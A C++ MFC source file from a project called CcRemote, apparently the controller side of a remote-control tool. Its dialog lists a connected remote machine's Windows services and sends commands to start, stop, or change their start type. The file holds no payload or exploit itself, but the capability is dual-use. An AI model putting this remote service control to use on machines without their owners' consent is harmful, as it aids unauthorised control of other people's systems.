// CServerDlg.cpp: 实现文件
//

#include "pch.h"
#include "CcRemote.h"
#include "CServerDlg.h"
#include "afxdialogex.h"
#include "..\..\common\macros.h"

// CServerDlg 对话框

IMPLEMENT_DYNAMIC(CServerDlg, CDialog)

CServerDlg::CServerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(IDD_SERVERDLG, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
}

CServerDlg::~CServerDlg()
{
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST, m_list);
}


BEGIN_MESSAGE_MAP(CServerDlg, CDialog)
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST, &CServerDlg::OnNMRClickList)
	ON_COMMAND(IDM_SERVER_REFUBISH, &CServerDlg::OnServerRefubish)
	ON_COMMAND(IDM_SERVER_START, &CServerDlg::OnServerStart)
	ON_COMMAND(IDM_SERVER_STOP, &CServerDlg::OnServerStop)
	ON_COMMAND(IDM_SERVER_AUTO, &CServerDlg::OnServerAuto)
	ON_COMMAND(IDM_SERVER_MANUAL, &CServerDlg::OnServerManual)
END_MESSAGE_MAP()


// CServerDlg 消息处理程序


BOOL CServerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 服务管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	//HWND hSerHeader = m_list.GetDlgItem(0)->GetSafeHwnd();
	//m_serHead.SubclassWindow(hSerHeader);
	//SortColumn(m_nSortedCol, m_bAscending);
	// 	m_serHead.InitializeHeader(TRUE);
	// 	m_serHead.EnableAutoSize(TRUE);
	// 	m_serHead.ResizeColumnsToFit();
	//初始化列表
	m_list.SetExtendedStyle(/*LVS_EX_FLATSB |*/ LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "真实名称", LVCFMT_LEFT, 150);
	m_list.InsertColumn(1, "显示名称", LVCFMT_LEFT, 260);
	m_list.InsertColumn(2, "启动类型", LVCFMT_LEFT, 80);
	m_list.InsertColumn(3, "运行状态", LVCFMT_LEFT, 80);
	m_list.InsertColumn(4, "可执行文件路径", LVCFMT_LEFT, 260);
	//GetServiceList();
	ShowServiceList();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


int CServerDlg::ShowServiceList(void)
{
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*DisplayName;
	char	*ServiceName;
	char	*serRunway;
	char	*serauto;
	char	*serfile;
	DWORD	dwOffset = 0;
	m_list.DeleteAllItems();

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		DisplayName = lpBuffer + dwOffset;
		ServiceName = DisplayName + lstrlen(DisplayName) + 1;
		serfile = ServiceName + lstrlen(ServiceName) + 1;
		serRunway = serfile + lstrlen(serfile) + 1;
		serauto = serRunway + lstrlen(serRunway) + 1;

		m_list.InsertItem(i, ServiceName);
		m_list.SetItemText(i, 1, DisplayName);
		m_list.SetItemText(i, 2, serauto);
		m_list.SetItemText(i, 3, serRunway);
		m_list.SetItemText(i, 4, serfile);

		dwOffset += lstrlen(DisplayName) + lstrlen(ServiceName) + lstrlen(serfile) + lstrlen(serRunway)
			+ lstrlen(serauto) + 5;
	}

	return 0;
}


void CServerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	if (m_list.m_hWnd == NULL)
	{
		return;
	}
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 0;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;
	m_list.MoveWindow(&rectList);
	// TODO: 在此处添加消息处理程序代码
}


void CServerDlg::OnNMRClickList(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu popMenu;
	VERIFY(popMenu.LoadMenu(IDR_MENU_SERVER));
	CMenu *p = popMenu.GetSubMenu(0);
	ASSERT(p != NULL);
	CPoint	point;
	GetCursorPos(&point);
	p->TrackPopupMenu(TPM_LEFTALIGN | TPM_LEFTBUTTON, point.x, point.y, this);
	*pResult = 0;
}


void CServerDlg::OnServerRefubish()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = COMMAND_SERVICELIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CServerDlg::OnReceiveComplete(void)
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SERVERLIST:
		ShowServiceList();
		break;
	default:
		// 传输发生异常数据
		break;
	}
}


void CServerDlg::ServiceConfig(BYTE bCmd)
{
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_list;
	// 	else
	// 		return;

	// TODO: Add your command handler code here

	DWORD	dwOffset = 2;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	//	while(pos) //so long as we have a valid POSITION, we keep iterating
	//	{
	int	nItem = pListCtrl->GetNextSelectedItem(pos);

	CString str1 = pListCtrl->GetItemText(nItem, 0);
	char*	sername = str1.GetBuffer(0);
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 3 + lstrlen(sername));
	lpBuffer[0] = COMMAND_SERVICECONFIG;
	lpBuffer[1] = bCmd;


	memcpy(lpBuffer + dwOffset, sername, lstrlen(sername) + 1);
	// 		str.Format("%d", LocalSize(lpBuffer));
	// 		AfxMessageBox(str);
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CServerDlg::OnServerStart()
{
	// TODO: 在此添加命令处理程序代码
	ServiceConfig(1);
}


void CServerDlg::OnServerStop()
{
	// TODO: 在此添加命令处理程序代码
	ServiceConfig(2);
}


void CServerDlg::OnServerAuto()
{
	// TODO: 在此添加命令处理程序代码
	ServiceConfig(3);
}


void CServerDlg::OnServerManual()
{
	// TODO: 在此添加命令处理程序代码
	ServiceConfig(4);
}
